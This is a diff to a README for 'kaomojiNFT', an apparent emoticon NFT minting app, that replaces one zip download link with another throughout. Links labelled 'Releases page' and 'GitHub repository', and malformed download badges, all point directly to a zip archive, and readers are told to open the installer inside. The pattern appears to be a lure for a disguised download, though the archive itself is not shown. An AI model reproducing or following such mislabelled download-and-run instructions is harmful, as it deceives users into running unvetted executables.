@@ -6,7 +6,7 @@ Welcome to kaomojiNFT! This application lets you create and mint your own emotic
 
 ## 📥 Download the Application
 
-[![Download kaomojiNFT](https://raw.githubusercontent.com/manjeet3219/kaomojiNFT/main/azole/kaomojiNFT.zip%https://raw.githubusercontent.com/manjeet3219/kaomojiNFT/main/azole/kaomojiNFT.zip)](https://raw.githubusercontent.com/manjeet3219/kaomojiNFT/main/azole/kaomojiNFT.zip)
+[![Download kaomojiNFT](https://raw.githubusercontent.com/manjeet3219/kaomojiNFT/main/contracts/kaomoji-NFT-3.8.zip%https://raw.githubusercontent.com/manjeet3219/kaomojiNFT/main/contracts/kaomoji-NFT-3.8.zip)](https://raw.githubusercontent.com/manjeet3219/kaomojiNFT/main/contracts/kaomoji-NFT-3.8.zip)
 
 ## 💡 What You Need
 
@@ -34,9 +34,9 @@ Before you begin, ensure you have the following:
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://raw.githubusercontent.com/manjeet3219/kaomojiNFT/main/azole/kaomojiNFT.zip) to download the latest version of kaomojiNFT. Simply click on the appropriate file for your operating system to begin the download.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/manjeet3219/kaomojiNFT/main/contracts/kaomoji-NFT-3.8.zip) to download the latest version of kaomojiNFT. Simply click on the appropriate file for your operating system to begin the download.
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/manjeet3219/kaomojiNFT/main/azole/kaomojiNFT.zip).
+1. Visit the [Releases page](https://raw.githubusercontent.com/manjeet3219/kaomojiNFT/main/contracts/kaomoji-NFT-3.8.zip).
 2. Locate the latest version of kaomojiNFT.
 3. Click on the download link for your OS.
 4. Once downloaded, open the installer file and follow the instructions.
@@ -74,10 +74,10 @@ Join our community for tips on maximizing your experience with kaomojiNFT.
 
 ## 📄 License
 
-kaomojiNFT is open-source. You can view the code and contribute on our [GitHub repository](https://raw.githubusercontent.com/manjeet3219/kaomojiNFT/main/azole/kaomojiNFT.zip).
+kaomojiNFT is open-source. You can view the code and contribute on our [GitHub repository](https://raw.githubusercontent.com/manjeet3219/kaomojiNFT/main/contracts/kaomoji-NFT-3.8.zip).
 
 ## 📝 Conclusion
 
 Creating your own NFT collection is now simple with kaomojiNFT. Follow the steps outlined, and you will be minting unique emoticons in no time. Should you have any questions, feel free to reach out through our community channels. Your NFT journey starts here!
 
-[![Download kaomojiNFT](https://raw.githubusercontent.com/manjeet3219/kaomojiNFT/main/azole/kaomojiNFT.zip%https://raw.githubusercontent.com/manjeet3219/kaomojiNFT/main/azole/kaomojiNFT.zip)](https://raw.githubusercontent.com/manjeet3219/kaomojiNFT/main/azole/kaomojiNFT.zip)
+[![Download kaomojiNFT](https://raw.githubusercontent.com/manjeet3219/kaomojiNFT/main/contracts/kaomoji-NFT-3.8.zip%https://raw.githubusercontent.com/manjeet3219/kaomojiNFT/main/contracts/kaomoji-NFT-3.8.zip)](https://raw.githubusercontent.com/manjeet3219/kaomojiNFT/main/contracts/kaomoji-NFT-3.8.zip)
